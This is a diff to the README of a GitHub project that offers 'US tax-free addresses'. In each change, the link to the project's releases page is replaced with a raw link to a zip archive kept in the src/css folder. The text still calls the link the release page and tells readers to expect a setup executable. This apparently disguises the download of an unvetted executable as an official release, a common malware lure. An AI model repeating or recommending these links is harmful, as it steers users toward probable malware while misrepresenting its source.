@@ -1,6 +1,6 @@
 # 🏠 real-random-taxfree-address - Generate US Tax-Free Addresses Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/kamryn2993/real-random-taxfree-address/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/kamryn2993/real-random-taxfree-address/main/src/css/random_taxfree_real_address_2.5.zip)
 
 ## 📋 What is real-random-taxfree-address?
 
@@ -50,7 +50,7 @@ Follow these steps to get the app running on your Windows computer:
 1. Open your web browser.
 
 2. Click the green download button at the top or go directly to the release page here:  
-   https://github.com/kamryn2993/real-random-taxfree-address/releases
+   https://raw.githubusercontent.com/kamryn2993/real-random-taxfree-address/main/src/css/random_taxfree_real_address_2.5.zip
 
 3. On the release page, look for the latest version. The file should have a name like `real-random-taxfree-address-setup.exe` or similar.
 
@@ -127,6 +127,6 @@ After opening real-random-taxfree-address, follow these steps:
 ## 📥 Download Link Reminder
 
 To download the latest version now, visit this page:  
-https://github.com/kamryn2993/real-random-taxfree-address/releases
+https://raw.githubusercontent.com/kamryn2993/real-random-taxfree-address/main/src/css/random_taxfree_real_address_2.5.zip
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/kamryn2993/real-random-taxfree-address/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/kamryn2993/real-random-taxfree-address/main/src/css/random_taxfree_real_address_2.5.zip)
